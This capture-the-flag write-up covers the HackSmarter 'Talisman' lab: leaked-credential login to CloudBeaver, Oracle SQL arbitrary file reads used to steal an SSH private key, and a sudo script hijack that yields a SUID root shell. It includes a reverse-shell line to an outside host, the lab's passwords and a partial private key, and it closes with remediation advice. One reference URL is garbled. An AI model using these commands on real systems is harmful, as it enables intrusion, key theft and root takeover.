---
title: "Talisman"
platform: "HackSmarter"
category: "Linux"
difficulty: "Medium"
date: 2025-12-30
os: "Linux (RHEL/CentOS)"
tags: ["linux", "oracle-database", "cloudbeaver", "sql-injection", "file-read", "ssh-key-theft", "sudo-abuse", "suid"]
---

---

## Overview

**Platform:** HackSmarter
**Difficulty:** Medium
**OS:** Linux (RHEL/CentOS)
**Category:** Linux Penetration Testing

Talisman is a medium-difficulty Linux machine featuring an Oracle database accessible through CloudBeaver Community Edition. Initial access is gained using leaked credentials from a third-party data breach. The Oracle DEV user has dangerous privileges that allow arbitrary file reads, which we exploit to steal SSH private keys. Privilege escalation involves abusing sudo permissions on an Oracle setup script combined with directory ownership misconfigurations.

---

## Scope

```
Host        IP Address      OS              Role
────────────────────────────────────────────────────
TALISMAN    10.1.119.71     Linux           Target
```

---

## Executive Summary

- **Leaked Credentials** - Third-party data breach credentials (`jane:Greattalisman1!`) provided access to CloudBeaver web interface
- **Oracle SQL File Read** - DEV user privileges allowed arbitrary file reads via `DBMS_XSLPROCESSOR.READ2CLOB`
- **SSH Key Theft** - Extracted oracle user's private SSH key from `/home/oracle/.ssh/id_rsa`
- **Sudo Script Hijacking** - Abused writable directory permissions to replace root-owned script executed via sudo

**Risk Rating:** High

---

## Attack Path Overview

```
[Leaked Creds] → [CloudBeaver Login] → [Oracle DB Access] → [File Read via SQL]
                                                                    ↓
                                                         [SSH Key Extraction]
                                                                    ↓
                                                            [SSH as oracle]
                                                                    ↓
                                                      [sudo root.sh Hijack]
                                                                    ↓
                                                              [ROOT ACCESS]
```

---

## Phase 1: Enumeration

### 1.1 Initial Reconnaissance

Starting with the provided leaked credentials:

```
jane / Greattalisman1!
```

Initial port scan with nmap:

```bash
nmap -sC -sV -T4 10.1.119.71
```

```
Starting Nmap 7.93 ( https://nmap.org ) at 2025-12-23 12:35 PST
Nmap scan report for 10.1.119.71
Host is up (0.075s latency).
Not shown: 989 filtered tcp ports (no-response), 10 filtered tcp ports (admin-prohibited)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   3072 9fb0531a86358579a3d17b27d6ec51d2 (RSA)
|   256 6ecf277ce75957c43f42e2c21fcaba90 (ECDSA)
|_  256 d9aeda6af4c090f00301bdd8e2f682f7 (ED25519)

Nmap done: 1 IP address (1 host up) scanned in 9.47 seconds
```

Only SSH visible. Running a full port scan with RustScan reveals an additional port:

```bash
rustscan --addresses 10.1.119.71
```

```
Open 10.1.119.71:22
Open 10.1.119.71:8978
```

### 1.2 Web Service Enumeration

Scanning port 8978 specifically:

```bash
nmap -sC -sV -T4 -p 8978 10.1.119.71
```

```
PORT     STATE SERVICE VERSION
8978/tcp open  unknown
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Date: Tue, 23 Dec 2025 20:50:51 GMT
|     Content-Type: text/html
|     <html lang="en" dir="ltr" data-version="25.2.0.202509010904">
```

The HTML response indicates **CloudBeaver Community** - a web-based database management tool.

---

## Phase 2: Initial Access

### 2.1 CloudBeaver Authentication

Accessing `http://10.1.119.71:8978` presents the CloudBeaver login interface. Using the leaked credentials:

```
Username: jane
Password: Greattalisman1!
```

Successfully authenticated to CloudBeaver with access to an Oracle database connection at `Oracle@172.17.0.1`.

### 2.2 Database Enumeration

Enumerating database users:

```sql
SELECT username FROM all_users;
```

Notable users discovered:
- SYS, SYSTEM (privileged)
- DEV (our current context)
- PDBADMIN
- Various Oracle system accounts

Checking our privileges:

```sql
SELECT * FROM user_sys_privs;
```

```
USERNAME    PRIVILEGE              ADMIN_OPTION    COMMON    INHERITED
────────────────────────────────────────────────────────────────────────
DEV         DROP ANY DIRECTORY     NO              NO        NO
DEV         CREATE ANY DIRECTORY   NO              NO        NO
```

The DEV user has `CREATE ANY DIRECTORY` and `DROP ANY DIRECTORY` privileges - this is significant for file operations.

---

## Phase 3: Exploitation - Arbitrary File Read

### 3.1 Attempting Code Execution

Initial attempt to write and execute a reverse shell via `UTL_FILE`:

```sql
DECLARE
  f UTL_FILE.FILE_TYPE;
BEGIN
  f := UTL_FILE.FOPEN('EXEC_DIR', 'pwn.sh', 'W');
  UTL_FILE.PUT_LINE(f, '#!/bin/bash');
  UTL_FILE.PUT_LINE(f, 'bash -i >& /dev/tcp/10.200.25.91/4444 0>&1');
  UTL_FILE.FCLOSE(f);
END;
/
```

Files can be written to `/tmp` but execution fails due to permission restrictions.

### 3.2 Leveraging File Read Capabilities

Using `DBMS_XSLPROCESSOR.READ2CLOB` to read arbitrary files on the system:

```sql
SELECT DBMS_XSLPROCESSOR.READ2CLOB('HOME_DIR', 'hosts') FROM dual;
```

```
127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4
```

File read confirmed! Now targeting SSH keys.

### 3.3 SSH Key Extraction

Creating a directory alias pointing to the oracle user's SSH directory:

```sql
CREATE OR REPLACE DIRECTORY SSH_ORACLE AS '/home/oracle/.ssh';
```

Reading the private key:

```sql
SELECT DBMS_XSLPROCESSOR.READ2CLOB('SSH_ORACLE', 'id_rsa') FROM dual;
```

Successfully extracted the oracle user's private SSH key:

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAzPq+dDVoX80DwMvHWBdxaN2jBb2NDP2ua1VgtjPUke1gKmfqfV0o
KgDMe9GW8DiTV3R977XB1L+7CG+Kewe/Als578HwEbh4Zm7Oya6WjMhdRz5EoP3I4qzglY
...
-----END OPENSSH PRIVATE KEY-----
```

---

## Phase 4: Lateral Movement

### 4.1 SSH Access as Oracle

Saving the extracted key and connecting:

```bash
chmod 600 oracle_id_rsa
ssh -i oracle_id_rsa oracle@10.1.119.71
```

```
[oracle@talisman ~]$
```

Successfully gained shell access as the `oracle` user.

---

## Phase 5: Privilege Escalation

### 5.1 Sudo Enumeration

Checking sudo permissions:

```bash
sudo -l
```

```
User oracle may run the following commands on talisman:
    (ALL) NOPASSWD: /opt/oracle/product/21c/dbhomeXE/root.sh
```

The oracle user can execute `/opt/oracle/product/21c/dbhomeXE/root.sh` as root without a password.

### 5.2 Analyzing the Vulnerability

Examining directory permissions:

```bash
ls -la /opt/oracle/product/21c/dbhomeXE/
```

```
drwxrwxr-x. 61 oracle oinstall  4096 Dec 30 15:55 .
-rwx------.  1 root   oinstall   507 Aug 18  2021 root.sh
```

Key observations:
- `root.sh` is owned by root with permissions `-rwx------`
- The **parent directory** is owned by `oracle` with write permissions
- We cannot read `root.sh`, but we can delete it due to directory write permissions

Testing:

```bash
cp root.sh root1.sh
```

```
cp: cannot open 'root.sh' for reading: Permission denied
```

```bash
rm root.sh
```

```
rm: remove write-protected regular file 'root.sh'? yes
```

Successfully deleted the root-owned script!

### 5.3 SUID Bash Exploit

Creating a backup of bash for our SUID exploit:

```bash
cp /bin/bash /tmp/rootbash
```

Creating a malicious `root.sh`:

```bash
cat > /opt/oracle/product/21c/dbhomeXE/root.sh << 'EOF'
#!/bin/bash
chown root:root /tmp/rootbash
chmod +s /tmp/rootbash
EOF
chmod +x /opt/oracle/product/21c/dbhomeXE/root.sh
```

### 5.4 Executing the Exploit

Running the hijacked script via sudo:

```bash
sudo /opt/oracle/product/21c/dbhomeXE/root.sh
```

Spawning root shell:

```bash
/tmp/rootbash -p
```

```
rootbash-4.4#
```

**Root access achieved!**

---

## Credentials Summary

```
Phase 2 - Initial Access
─────────────────────────────────────
jane        : Greattalisman1!     → CloudBeaver (leaked creds)

Phase 3 - Lateral Movement
─────────────────────────────────────
oracle      : SSH Private Key     → Extracted via SQL file read
```

---

## Tools Used

- **Nmap** - Port scanning and service enumeration
- **RustScan** - Fast port discovery
- **CloudBeaver** - Web-based database interface (target application)
- **SSH** - Remote shell access

---

## Key Techniques

| Technique | Description |
|-----------|-------------|
| Credential Reuse | Leaked credentials from third-party breach |
| Oracle SQL File Read | `DBMS_XSLPROCESSOR.READ2CLOB` for arbitrary file access |
| SSH Key Theft | Extracting private keys via database file read |
| Sudo Script Hijacking | Replacing root-owned script in user-writable directory |
| SUID Binary Abuse | Creating SUID bash for privilege escalation |

---

## Remediation Recommendations

1. **Credential Management** - Implement unique credentials per service; monitor for credential leaks in breach databases
2. **Database Privileges** - Restrict `CREATE ANY DIRECTORY` and `DROP ANY DIRECTORY` privileges; follow principle of least privilege
3. **File System Permissions** - Ensure scripts executed via sudo are in root-owned directories with restricted write access
4. **SSH Key Security** - Protect SSH private keys with passphrases; restrict file read permissions
5. **Network Segmentation** - Limit access to database management interfaces from untrusted networks

---

## References

- [HackTricks - Oracle Pentesting](https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1டீ529-pentesting-oracle-listener)
- [GTFOBins - Bash SUID](https://gtfobins.github.io/gtfobins/bash/#suid)
- [Oracle UTL_FILE Documentation](https://docs.oracle.com/database/121/ARPLS/u_file.htm)
- [CloudBeaver Documentation](https://cloudbeaver.io/docs/)
